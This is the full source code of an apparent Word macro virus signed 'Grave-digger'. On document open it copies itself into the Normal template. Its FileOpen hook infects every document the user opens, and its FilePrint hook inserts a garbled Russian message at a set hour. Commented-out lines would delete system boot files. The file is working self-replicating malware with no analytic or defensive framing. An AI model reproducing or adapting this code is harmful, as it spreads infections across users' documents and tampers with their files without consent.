   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim k
   Dim j
   Dim i
   On Error GoTo -1: On Error GoTo fail
   k = 0
   j = WordBasic.CountMacros(0, 0)
         For i = 1 To j
         If WordBasic.[MacroName$](i, 0, 0) = "Knell" Then k = 1
         Next i
   If k = 1 Then GoTo fail
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Normal:AutoOp"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":Knell", "Normal:Knell"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":Mutagen", "Normal:FileOpen"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":Zashib", "Normal:FilePrint"
   fail:
   End Sub

   Attribute VB_Name = "Mutagen"

   Public Sub MAIN()
   Dim thishour
   Dim name_$
   Dim k1
   Dim ic
   Dim i
   Dim ct$
   thishour = WordBasic.Hour(WordBasic.Now())
   WordBasic.PrintStatusBar thishour
   If thishour <> 13 Then GoTo proiti
   Rem kill "c:\autoexec.bat"
   Rem kill "c:\command.com"
   On Error GoTo -1: On Error GoTo fail
   name_$ = "Grave-digger"
   WordBasic.PrintStatusBar name_$
   proiti:
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
   WordBasic.CurValues.FileOpen dlg
   WordBasic.Dialog.FileOpen dlg
   WordBasic.FileOpen dlg
   k1 = 0
   ic = WordBasic.CountMacros(1, 0, 0)
            For i = 1 To ic
            ct$ = WordBasic.[MacroName$](i, 1)
            If ct$ = "Knell" Then k1 = 1
            Next i
   If k1 = 1 Then GoTo fail
   WordBasic.FileSaveAs WordBasic.[FileName$](), Format:=1
   WordBasic.MacroCopy "Normal:AutoOp", WordBasic.[FileName$]() + ":AutoOpen"
   WordBasic.MacroCopy "Normal:Knell", WordBasic.[FileName$]() + ":Knell"
   WordBasic.MacroCopy "Normal:FileOpen", WordBasic.[FileName$]() + ":Mutagen"
   WordBasic.MacroCopy "Normal:FilePrint", WordBasic.[FileName$]() + ":Zashib"
   fail:
   End Sub

   Attribute VB_Name = "Zashib"

   Public Sub MAIN()
   Dim th
   th = WordBasic.Hour(WordBasic.Now())
   If th <> 16 Then GoTo fail
   WordBasic.PrintStatusBar th
   WordBasic.EndOfDocument
   WordBasic.Insert "" + Chr(34) + "Çàøèáèñü,îäíàêî îòïå÷àòàëîñü!!!" + Chr(34)
   fail:
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FilePrint(False)
   WordBasic.CurValues.FilePrint dlg
   WordBasic.Dialog.FilePrint dlg
   WordBasic.FilePrint dlg
   End Sub

   Attribute VB_Name = "Knell"

   Public Sub MAIN()
   'Grave-digger
   End Sub
